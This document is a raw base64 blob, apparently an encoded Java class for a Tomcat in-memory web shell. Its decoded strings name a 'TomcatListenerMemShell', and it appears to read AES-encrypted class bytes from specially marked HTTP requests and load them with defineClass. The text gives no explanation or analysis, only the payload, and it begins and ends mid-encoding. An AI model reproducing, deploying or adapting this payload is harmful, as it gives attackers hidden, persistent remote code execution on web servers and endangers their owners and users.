6WXpabE1HSTRZVGxqTVRVeU1qUmhEQUJvQUdrQkFBUndRVk16REFCcUFHa0JBQkF2Wm1GMmFXTnZibVJsYlc4dWFXTnZEQUJyQUdrQkFCZHFZWFpoTDJ4aGJtY3ZVM1J5YVc1blFuVnBiR1JsY2d3Qkh3RWdEQUVoQVNJTUFHd0FpUXdBYkFCcEFRQUZWVlJHTFRnTUFHMEFhUXdBYmdCMURBRWpBU1FCQUFOQlJWTUhBUnNNQVNVQkpnRUFIMnBoZG1GNEwyTnllWEIwYnk5emNHVmpMMU5sWTNKbGRFdGxlVk53WldNTUFTY0JLQXdBYmdFcERBRXFBU3NNQVN3QkxRRUFFMnBoZG1FdmJHRnVaeTlGZUdObGNIUnBiMjRCQUFOTlJEVUhBUzRNQVNVQkx3d0JNQUV4REFFeUFUTUJBQlJxWVhaaEwyMWhkR2d2UW1sblNXNTBaV2RsY2d3Qk5BRW9EQUJ1QVRVTUFTRUJOZ3dCTndFaUFRQVFhbUYyWVM1MWRHbHNMa0poYzJVMk5Bd0JPQUU1QVFBS1oyVjBSVzVqYjJSbGNnRUFFbHRNYW1GMllTOXNZVzVuTDBOc1lYTnpPd3dCT2dFN0FRQVRXMHhxWVhaaEwyeGhibWN2VDJKcVpXTjBPd2NCUEF3QlBRRStEQUUvQVVBQkFBNWxibU52WkdWVWIxTjBjbWx1WndFQUQycGhkbUV2YkdGdVp5OURiR0Z6Y3dFQUVHcGhkbUV2YkdGdVp5OVBZbXBsWTNRQkFCQnFZWFpoTDJ4aGJtY3ZVM1J5YVc1bkFRQVdjM1Z1TG0xcGMyTXVRa0ZUUlRZMFJXNWpiMlJsY2d3QlFRRkNBUUFHWlc1amIyUmxBUUFLWjJWMFJHVmpiMlJsY2dFQUJtUmxZMjlrWlFFQUZuTjFiaTV0YVhOakxrSkJVMFUyTkVSbFkyOWtaWElCQUF4a1pXTnZaR1ZDZFdabVpYSU1BVU1BYnd3QW1nRkVCd0VkREFGRkFVWUJBQ1ZxWVhaaGVDOXpaWEoyYkdWMEwyaDBkSEF2U0hSMGNGTmxjblpzWlhSU1pYRjFaWE4wREFDdkFMQUJBQkJZTFZKbGNYVmxjM1JsWkMxWGFYUm9EQUZIQUlrQkFBNVlUVXhJVkZSUVVtVnhkV1Z6ZEF3QlNBRkpEQUNhQUpzTUFVb0JTd3dCVEFDSkRBQ1hBSmdNQUh3QWZRRUFFRzFsYlhOb1pXeHNMbkJoZVd4dllXUUhBUjRNQVUwQlRnRUFIRzFsYlhOb1pXeHNMMVJ2YldOaGRFeHBjM1JsYm1WeVUyaGxiR3dNQVU4QlVBd0FlQUI1REFGUkFWSUJBQXB3WVhKaGJXVjBaWEp6QVFBZGFtRjJZUzlwYnk5Q2VYUmxRWEp5WVhsUGRYUndkWFJUZEhKbFlXME1BVk1CVkF3QlZRRldCd0VjREFGWEFWZ01BVmtCS0F3QWpRQ09EQUZWQVRZQkFBNVliV3hJVkZSUVVtVnhkV1Z6ZEFFQUIxTjFZMk5sYzNNTUFWb0Fid3dCV3dGY0J3RmREQUZlQVY4TUFXQUJZUUVBSm1waGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjM0J2Ym5ObEFRQVZhbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5QVFBa2FtRjJZWGd2YzJWeWRteGxkQzlUWlhKMmJHVjBVbVZ4ZFdWemRFeHBjM1JsYm1WeUFRQVRhbUYyWVhndlkzSjVjSFJ2TDBOcGNHaGxjZ0VBRG1waGRtRXZhVzh2VjNKcGRHVnlBUUFoYW1GMllYZ3ZjMlZ5ZG14bGRDOVRaWEoyYkdWMFVtVnhkV1Z6ZEVWMlpXNTBBUUFlYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWE56YVc5dUFRQUdZWEJ3Wlc1a0FRQXRLRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXNZVzVuTDFOMGNtbHVaMEoxYVd4a1pYSTdBUUFJZEc5VGRISnBibWNCQUJRb0tVeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFDMlJsWm1sdVpVTnNZWE56QVFBWEtGdENTVWtwVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjenNCQUF0blpYUkpibk4wWVc1alpRRUFLU2hNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVEdwaGRtRjRMMk55ZVhCMGJ5OURhWEJvWlhJN0FRQUlaMlYwUW5sMFpYTUJBQVFvS1Z0Q0FRQVhLRnRDVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1ZZQkFBUnBibWwwQVFBWEtFbE1hbUYyWVM5elpXTjFjbWwwZVM5TFpYazdLVllCQUFka2IwWnBibUZzQVFBR0tGdENLVnRDQVFBYmFtRjJZUzl6WldOMWNtbDBlUzlOWlhOellXZGxSR2xuWlhOMEFRQXhLRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXpaV04xY21sMGVTOU5aWE56WVdkbFJHbG5aWE4wT3dFQUJteGxibWQwYUFFQUF5Z3BTUUVBQm5Wd1pHRjBaUUVBQnloYlFrbEpLVllCQUFaa2FXZGxjM1FCQUFZb1NWdENLVllCQUJVb1NTbE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQXQwYjFWd2NHVnlRMkZ6WlFFQUIyWnZjazVoYldVQkFDVW9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFKWjJWMFRXVjBhRzlrQVFCQUtFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk8xdE1hbUYyWVM5c1lXNW5MME5zWVhOek95bE1hbUYyWVM5c1lXNW5MM0psWm14bFkzUXZUV1YwYUc5a093RUFHR3BoZG1FdmJHRnVaeTl5Wldac1pXTjBMMDFsZEdodlpBRUFCbWx1ZG05clpRRUFPU2hNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHRiVEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3S1V4cVlYWmhMMnhoYm1jdlQySnFaV04wT3dFQUNHZGxkRU5zWVhOekFRQVRLQ2xNYW1GMllTOXNZVzVuTDBOc1lYTnpPd0VBQzI1bGQwbHVjM1JoYm1ObEFRQVVLQ2xNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNCQUFWeVpYTmxkQUVBRnlncFRHcGhkbUV2YVc4dlVISnBiblJYY21sMFpYSTdBUUFSWjJWMFUyVnlkbXhsZEZKbGNYVmxjM1FCQUNBb0tVeHFZWFpoZUM5elpYSjJiR1YwTDFObGNuWnNaWFJTWlhGMVpYTjBPd0VBQ1dkbGRFaGxZV1JsY2dFQUIybHVaR1Y0VDJZQkFCVW9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVWtCQUFwblpYUlRaWE56YVc5dUFRQWlLQ2xNYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWE56YVc5dU93RUFER2RsZEZCaGNtRnRaWFJsY2dFQURHZGxkRUYwZEhKcFluVjBaUUVBSmloTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OVBZbXBsWTNRN0FRQU9aMlYwUTJ4aGMzTk1iMkZrWlhJQkFCa29LVXhxWVhaaEwyeGhibWN2UTJ4aGMzTk1iMkZrWlhJN0FRQU1jMlYwUVhSMGNtbGlkWFJsQVFBbktFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk8weHFZWFpoTDJ4aGJtY3ZUMkpxWldOME95bFdBUUFHWlhGMVlXeHpBUUFWS0V4cVlYWmhMMnhoYm1jdlQySnFaV04wT3lsYUFRQUpjM1ZpYzNSeWFXNW5BUUFXS0VsSktVeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFCWGR5YVhSbEFRQVZLRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxXQVFBTGRHOUNlWFJsUVhKeVlYa0JBQTl3Y21sdWRGTjBZV05yVkhKaFkyVUJBQkJuWlhSRVpXTnNZWEpsWkVacFpXeGtBUUF0S0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsTWFtRjJZUzlzWVc1bkwzSmxabXhsWTNRdlJtbGxiR1E3QVFBWGFtRjJZUzlzWVc1bkwzSmxabXhsWTNRdlJtbGxiR1FCQUExelpYUkJZMk5sYzNOcFlteGxBUUFFS0ZvcFZnRUFBMmRsZEFFQUppaE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc3BUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdBQ0VBU1FCaUFBRUFZd0FIQUFFQVpBQmxBQUFBQVFCbUFHY0FBQUFBQUdnQWFRQUFBQUVBYWdCcEFBQUFBUUJyQUdrQUFBQUFBR3dBYVFBQUFBRUFiUUJwQUFBQUN3QUJBRzRBYndBQkFIQUFBQUNRQUFNQUFRQUFBRVlxdHdBQktnRzFBQUlxQWJVQUF5b1NCTFVBQlNvU0JyVUFCeW9TQ0xVQUNTcTdBQXBadHdBTEtyUUFCN1lBRENxMEFBVzJBQXkyQUEyNEFBNjFBQThxRWhDMUFCR3hBQUFBQWdCeEFBQUFKZ0FKQUFBQUd3QUVBQk1BQ1FBVUFBNEFGUUFVQUJZQUdnQVhBQ0FBSEFBL0FCMEFSUUFlQUhJQUFBQU1BQUVBQUFCR0FITUFkQUFBQUFFQWJnQjFBQUVBY0FBQUFKc0FBd0FDQUFBQVJ5b3J0d0FTS2dHMUFBSXFBYlVBQXlvU0JMVUFCU29TQnJVQUJ5b1NDTFVBQ1NxN0FBcFp0d0FMS3JRQUI3WUFEQ3EwQUFXMkFBeTJBQTI0QUE2MUFBOHFFaEMxQUJHeEFBQUFBZ0J4QUFBQUpnQUpBQUFBSWdBRkFCTUFDZ0FVQUE4QUZRQVZBQllBR3dBWEFDRUFJd0JBQUNRQVJnQWxBSElBQUFBV0FBSUFBQUJIQUhNQWRBQUFBQUFBUndCMkFIY0FBUUFCQUhnQWVRQUJBSEFBQUFBOUFBUUFBZ0FBQUFrcUt3TXJ2cmNBRTdBQUFBQUNBSEVBQUFBR0FBRUFBQUFvQUhJQUFBQVdBQUlBQUFBSkFITUFkQUFBQUFBQUNRQjZBSHNBQVFBQkFId0FmUUFCQUhBQUFBRFlBQVlBQkFBQUFDd1NGTGdBRlU0dEhKa0FCd1NuQUFRRnV3QVdXU3EwQUFXMkFCY1NGTGNBR0xZQUdTMHJ0Z0Fhc0U0QnNBQUJBQUFBS0FBcEFCc0FBd0J4QUFBQUZnQUZBQUFBTFFBR0FDNEFJd0F2QUNrQU1BQXFBREVBY2dBQUFEUUFCUUFHQUNNQWZnQi9BQU1BS2dBQ0FJQUFnUUFEQUFBQUxBQnpBSFFBQUFBQUFDd0FnZ0I3QUFFQUFBQXNBSU1BaEFBQ0FJVUFBQUE4QUFQL0FBOEFCQWNBaGdjQUx3RUhBSWNBQVFjQWgvOEFBQUFFQndDR0J3QXZBUWNBaHdBQ0J3Q0hBZjhBR0FBREJ3Q0dCd0F2QVFBQkJ3Q0lBQWtBYkFDSkFBRUFjQUFBQUtjQUJBQURBQUFBTUFGTUVoeTRBQjFOTENxMkFCY0RLcllBSHJZQUg3c0FJRmtFTExZQUliY0FJaEFRdGdBanRnQWtUS2NBQkUwcnNBQUJBQUlBS2dBdEFCc0FBd0J4QUFBQUhnQUhBQUFBTmdBQ0FEa0FDQUE2QUJVQU93QXFBRDBBTFFBOEFDNEFQd0J5QUFBQUlBQURBQWdBSWdDREFJb0FBZ0FBQURBQWdnQnBBQUFBQWdBdUFJc0FhUUFCQUlVQUFBQVRBQUwvQUMwQUFnY0FqQWNBakFBQkJ3Q0lBQUFKQUkwQWpnQUNBSEFBQUFGSkFBWUFCUUFBQUhnQlRCSWx1QUFtVFN3U0p3SEFBQ2kyQUNrc0FjQUFLcllBSzA0dHRnQXNFaTBFdlFBdVdRTVNMMU8yQUNrdEJMMEFNRmtES2xPMkFDdkFBREZNcHdBNVRoSXl1QUFtVFN5MkFETTZCQmtFdGdBc0VqUUV2UUF1V1FNU0wxTzJBQ2taQkFTOUFEQlpBeXBUdGdBcndBQXhUS2NBQlRvRUs3QUFBZ0FDQUQwQVFBQWJBRUVBY1FCMEFCc0FBd0J4QUFBQU1nQU1BQUFBUXdBQ0FFY0FDQUJJQUJzQVNRQTlBRkVBUUFCS0FFRUFUQUJIQUUwQVRRQk9BSEVBVUFCMEFFOEFkZ0JUQUhJQUFBQklBQWNBR3dBaUFJOEFrQUFEQUFnQU9BQ1JBSklBQWdCTkFDUUFqd0NRQUFRQVJ3QXRBSkVBa2dBQ0FFRUFOUUNUQUlFQUF3QUFBSGdBbEFCN0FBQUFBZ0IyQUpVQWFRQUJBSVVBQUFBcEFBUC9BRUFBQWdjQUx3Y0FqQUFCQndDSS93QXpBQVFIQUM4SEFJd0FCd0NJQUFFSEFJajVBQUVBbGdBQUFBUUFBUUFiQUFrQWx3Q1lBQUlBY0FBQUFWVUFCZ0FGQUFBQWhBRk1FaVc0QUNaTkxCSTFBY0FBS0xZQUtTd0J3QUFxdGdBclRpMjJBQ3dTTmdTOUFDNVpBeEl4VTdZQUtTMEV2UUF3V1FNcVU3WUFLOEFBTDhBQUw4QUFMMHluQUQ5T0VqZTRBQ1pOTExZQU16b0VHUVMyQUN3U09BUzlBQzVaQXhJeFU3WUFLUmtFQkwwQU1Ga0RLbE8yQUN2QUFDL0FBQy9BQUM5TXB3QUZPZ1Fyc0FBQ0FBSUFRd0JHQUJzQVJ3QjlBSUFBR3dBREFIRUFBQUF5QUF3QUFBQlhBQUlBV3dBSUFGd0FHd0JkQUVNQVpRQkdBRjRBUndCZ0FFMEFZUUJUQUdJQWZRQmtBSUFBWXdDQ0FHWUFjZ0FBQUVnQUJ3QWJBQ2dBbVFDUUFBTUFDQUErQUpFQWtnQUNBRk1BS2dDWkFKQUFCQUJOQURNQWtRQ1NBQUlBUndBN0FKTUFnUUFEQUFBQWhBQ1VBR2tBQUFBQ0FJSUFsUUI3QUFFQWhRQUFBQ2tBQS84QVJnQUNCd0NNQndBdkFBRUhBSWovQURrQUJBY0FqQWNBTHdBSEFJZ0FBUWNBaVBrQUFRQ1dBQUFBQkFBQkFCc0FDZ0NhQUpzQUFRQndBQUFBZmdBQkFBTUFBQUFWS3JrQU9RRUFBVXdxdVFBNkFRQk1wd0FFVFN1d0FBRUFDQUFQQUJJQUd3QURBSEVBQUFBYUFBWUFBQUJxQUFZQWF3QUlBRzBBRHdCeEFCSUFjQUFUQUhJQWNnQUFBQllBQWdBQUFCVUFaZ0JuQUFBQUNBQU5BSndBblFBQkFJVUFBQUFUQUFML0FCSUFBZ2NBbmdjQW53QUJCd0NJQUFBQkFLQUFvUUFCQUhBQUFBQTFBQUFBQWdBQUFBR3hBQUFBQWdCeEFBQUFCZ0FCQUFBQWVBQnlBQUFBRmdBQ0FBQUFBUUJ6QUhRQUFBQUFBQUVBb2dDakFBRUFBUUNrQUtFQUFRQndBQUFDWUFBRkFBa0FBQUVpSzdZQU84QUFQRTBxTExZQVBVNHNFajY1QUQ4Q0FNWUEyU3dTUHJrQVB3SUFFa0MyQUVFQ253RElMYmdBUWpvRUxMa0FRd0VBT2dVc0tyUUFCN2tBUkFJQXVBQkZPZ1lxR1FZRHRnQkdPZ1laQlJKSHVRQklBZ0RIQUNJWkJSSkh1d0JKV1NxMkFDeTJBRXEzQUVzWkJyWUFUTGtBVFFNQXB3QjBMQkpPR1FhNUFFOERBTHNBVUZtM0FGRTZCeGtGRWtlNUFFZ0NBTUFBTHJZQU16b0lHUWdaQjdZQVVsY1pDQmtHdGdCU1Z4a0lMTFlBVWxjWkJDcTBBQThERUJDMkFGTzJBRlFaQ0xZQVZWY1pCQ29aQjdZQVZnUzJBRWE0QUZlMkFGUVpCQ3EwQUE4UUVMWUFXTFlBVkxHbkFDMHNFajY1QUQ4Q0FNWUFJaXdTUHJrQVB3SUFFbG0yQUVFQ253QVJMYmdBUWpvRUdRUVNXcllBVkxHbkFBaE5MTFlBVzdFQUFnQUFBT3NCSEFBYkFPd0JHQUVjQUJzQUF3QnhBQUFBZGdBZEFBQUFmUUFJQUg0QURnQ0FBQ29BZ1FBd0FJSUFPQUNFQUVjQWhRQlFBSVlBWEFDSEFIc0FpUUNGQUlvQWpnQ0xBSjhBakFDbkFJMEFyd0NPQUxZQWp3REZBSkFBeXdDUkFOMEFrZ0RyQUpNQTdBQ1ZBTzhBbGdFTEFKY0JFUUNZQVJnQW1RRVpBSjBCSEFDYkFSMEFuQUVoQUtFQWNnQUFBSEFBQ3dDT0FGNEFwUUNtQUFjQW53Qk5BS2NBa0FBSUFEQUF2QUNjQUowQUJBQTRBTFFBcUFDcEFBVUFSd0NsQUtvQWV3QUdBUkVBQ0FDY0FKMEFCQUFJQVJFQVpBQmxBQUlBRGdFTEFHWUFad0FEQVIwQUJBQ3JBSUVBQWdBQUFTSUFjd0IwQUFBQUFBRWlBS0lBb3dBQkFJVUFBQUFxQUFiL0FIc0FCd2NBaGdjQXJBY0FyUWNBbmdjQW53Y0FyZ2NBTHdBQStBQndBdmtBS1VJSEFJZ0VBQ0VBcndDd0FBRUFjQUFBQVVjQUFnQUhBQUFBV3dGTks3WUFMQkpjdGdCZFRpMEV0Z0JlTFN1MkFGL0FBR0JOcHdBL1RpdTJBQ3dTWWJZQVhUb0VHUVFFdGdCZUdRUXJ0Z0JmT2dVWkJiWUFMQkpjdGdCZE9nWVpCZ1MyQUY0WkJoa0Z0Z0Jmd0FCZ1RhY0FCVG9FTExBQUFnQUNBQm9BSFFBYkFCNEFWQUJYQUJzQUF3QnhBQUFBUGdBUEFBQUFwQUFDQUtjQURBQ29BQkVBcVFBYUFMUUFIUUNxQUI0QXJBQXBBSzBBTHdDdUFEY0Fyd0JEQUxBQVNRQ3hBRlFBc3dCWEFMSUFXUUMyQUhJQUFBQlNBQWdBREFBT0FMRUFzZ0FEQUNrQUt3Q0FBTElBQkFBM0FCMEFzd0NRQUFVQVF3QVJBSk1Bc2dBR0FCNEFPd0MwQUlFQUF3QUFBRnNBY3dCMEFBQUFBQUJiQUxVQVpRQUJBQUlBV1FDMkFHY0FBZ0NGQUFBQUxnQUQvd0FkQUFNSEFJWUhBSzBIQUo0QUFRY0FpUDhBT1FBRUJ3Q0dCd0N0QndDZUJ3Q0lBQUVIQUlqNkFBRUFBUUMzQUFBQUFnQzQMALYAtwEAEGphdmEudXRpbC5CYXNlNjQBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgEAHG1lbXNoZWxsLlRvbWNhdExpc3RlbmVyU2hlbGwBAB9tZW1zaGVsbC9Ub21jYXRMaXN0ZW5lck1lbVNoZWxsAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBABFqYXZhL2xhbmcvQm9vbGVhbgEAEmphdmEvdXRpbC9JdGVyYXRvcgEAEGphdmEvbGFuZy9UaHJlYWQBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGphdmEvdXRpbC9BcnJheXMBAAZhc0xpc3QBACUoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS91dGlsL0xpc3Q7AQAHdmFsdWVPZgEAFihaKUxqYXZhL2xhbmcvQm9vbGVhbjsBAAhpdGVyYXRvcgEAFigpTGphdmEvdXRpbC9JdGVyYXRvcjsBAAdoYXNOZXh0AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQADYWRkAQAMYm9vbGVhblZhbHVlAQAHdG9BcnJheQEAFSgpW0xqYXZhL2xhbmcvT2JqZWN0OwEADWdldFN1cGVyY2xhc3MBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAKChbTGphdmEvbGFuZy9PYmplY3Q7KVtMamF2YS9sYW5nL09iamVjdDsBAA1jdXJyZW50VGh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